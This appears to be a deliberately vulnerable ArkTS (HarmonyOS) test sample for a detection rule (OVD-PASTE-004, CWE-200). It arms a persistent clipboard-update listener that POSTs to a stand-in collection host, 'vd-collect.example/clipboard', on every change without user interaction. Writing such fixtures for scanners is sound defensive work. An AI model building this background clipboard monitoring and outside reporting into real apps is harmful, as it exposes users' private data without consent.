// VULN: OVD-PASTE-004 剪贴板常驻监听（on('update') 持续截获系统剪贴板内容，CWE-200）
// 规则语义：update 订阅 + 收集端点常量在 record 域共同出现
import { pasteboard, BusinessError } from '@kit.BasicServicesKit';
import { http } from '@kit.NetworkKit';

export function ovdPaste004(): string {
  const pb = pasteboard.getSystemPasteboard();
  let err = '';
  try {
    // 常驻订阅：应用生命周期内任何剪贴板变化都触发回调（无前台用户交互）
    pb.on('update', () => {
      const req: http.HttpRequest = http.createHttp();
      req.request('https://vd-collect.example/clipboard', {
        method: http.RequestMethod.POST,
        extraData: 'update=1',
        readTimeout: 3000,
        connectTimeout: 3000
      }).catch(() => {});
      req.destroy();
    });
  } catch (e) {
    err = ` (on err=${(e as BusinessError).code})`;
  }
  return 'clipboard update listener armed (persistent)';
}
